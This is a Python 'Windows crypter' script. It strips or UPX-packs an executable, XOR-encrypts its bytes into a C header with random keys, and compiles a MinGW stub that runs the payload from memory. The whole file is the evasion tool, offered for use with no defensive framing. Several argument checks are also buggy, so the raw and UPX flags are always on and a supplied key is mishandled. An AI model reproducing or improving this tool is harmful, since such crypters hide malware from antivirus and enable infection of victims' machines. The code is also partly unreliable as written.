#!/usr/bin/env python3

import os
import sys
import random
import string
import argparse

version     = "0.1"
FILETYPE    = None
PE_IMAGE    = None
OUT_NAME    = None
CRYPTKEY    = None
BINASRAW    = False
NULLBKEY    = None
UPXPACK     = False

def gen_rand_filename():
    name = ""
    for i in range(1, 10):
        name += random.choice(list(string.ascii_uppercase + string.ascii_lowercase))
    return name

def gen_rand_key():
    global CRYPTKEY, NULLBKEY
    CRYPTKEY = random.randint(100, 999)
    print(f"[+] Using key {hex(CRYPTKEY)}")

def gen_null_key():
    global NULLBKEY
    NULLBKEY = random.randint(17, 50)
    print(f"[+] Using null key {hex(NULLBKEY)}")

def get_file_as_hex(infile):
    bytes = ""
    with open(infile, "rb") as file:
        data = file.read()
        data_len = len(data)
    iter = 0
    for num, byte in enumerate(data):
        byte = hex(byte)
        if byte == hex(0x00):
            byte = hex(NULLBKEY)
        else:
            byte = hex(int(byte, 16) ^ CRYPTKEY)
            if len(str(byte)) == 3:
                byte = str(byte).replace("0x", '')
                byte = f"0x0{byte}"
        iter += 1
        if num == data_len - 1:
            bytes += f"{str(byte)}"
            return bytes, data_len
        if iter == 16:
            bytes += f"{str(byte)},\n"
            iter = 0
            continue
        bytes += f"{str(byte)}, "

def prepare_pe_image(bytes_len, hex_bytes):
    global PE_IMAGE
    PE_IMAGE =  f"#define array_len {bytes_len}\n\n"
    PE_IMAGE += "unsigned long long image_crypt[] = {\n"
    PE_IMAGE += hex_bytes
    PE_IMAGE += "\n};"

def write_pe_image():
    global PE_IMAGE
    with open("lib/pe_image.h", "w") as file:
        file.write(PE_IMAGE)

def write_header_file():
    with open("lib/main.h", "w") as file:
        HEADFILE =  f"#define key {hex(CRYPTKEY)}\n"
        HEADFILE +=  f"#define null_key {hex(NULLBKEY)}\n"
        HEADFILE += "void RunFromMemory(char* pImage, char* pPath);"
        file.write(HEADFILE)

def compile():
    global OUT_NAME
    os.system(f"i686-w64-mingw32-g++ lib/exec_memory.cpp lib/main.cpp -o {OUT_NAME} -static")

def strip_bin(infile):
    os.system(f"strip {infile} > /dev/null")
    return get_size(infile)

def get_size(filename):
    with open(filename, "rb") as file:
        length = len(file.read())
        return length

def pack_with_upx(file):
    name = gen_rand_filename() + ".exe"
    os.system(f"upx {file} -o {name} > /dev/null")
    print(f"[+] Packed {file} with upx, stored it in {name}")
    return name

def crypt(infile):
    print(f"[+] Starting to crypt {infile} ({get_size(infile)} bytes)")
    if UPXPACK:
        infile = pack_with_upx(infile)
    else:
        length = strip_bin(infile)
        print(f"[+] Stripped {infile} down to {length} bytes")
    gen_null_key()
    hex_bytes, bytes_len = get_file_as_hex(infile)
    prepare_pe_image(bytes_len, hex_bytes)
    write_pe_image()
    print("[+] Extracted bytes and created pe image")
    write_header_file()
    compile()
    print(f"[*] Wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")

if __name__ == '__main__':
    ap = argparse.ArgumentParser()

    print(f"Windows crypter by Dylan Halls (v{version})\n")

    ap.add_argument("file", help="file to crypt, assumed as binary if not told otherwise")
    ap.add_argument("-u", "--upx", required=False, action='store_true', help="upx file before crypting")
    ap.add_argument("-b", "--binary", required=False, action='store_true', help="provide if file is a binary exe")
    ap.add_argument("-s", "--source", required=False, action='store_true', help="provide if the file is c source code")
    ap.add_argument("-r", "--raw", required=False, action='store_true', help="store binary in memory without encrypting")
    ap.add_argument("-k", "--key", required=False, help="key to encrypt with, randomly generated if not supplied")
    ap.add_argument("-o", "--outfile", required=False, help="name of outfile, if not provided then random filename is assigned")

    args = vars(ap.parse_args())

    if (args['binary'] and args['source']) is None:
        FILETYPE = "binary"
    else:
        if args['binary'] is not None: FILETYPE = 'binary'
        if args['source'] is not None: FILETYPE = 'source'

    if args['outfile'] is None:
        OUT_NAME = gen_rand_filename()
    else:
        OUT_NAME = args['outfile']

    if args['key'] is not None:
        CRYPTKEY = hex(args['key'])
    else:
        gen_rand_key()

    if args['raw'] is not None:
        BINASRAW = True

    if args['upx'] is not None:
        UPXPACK = True

    crypt(args['file'])
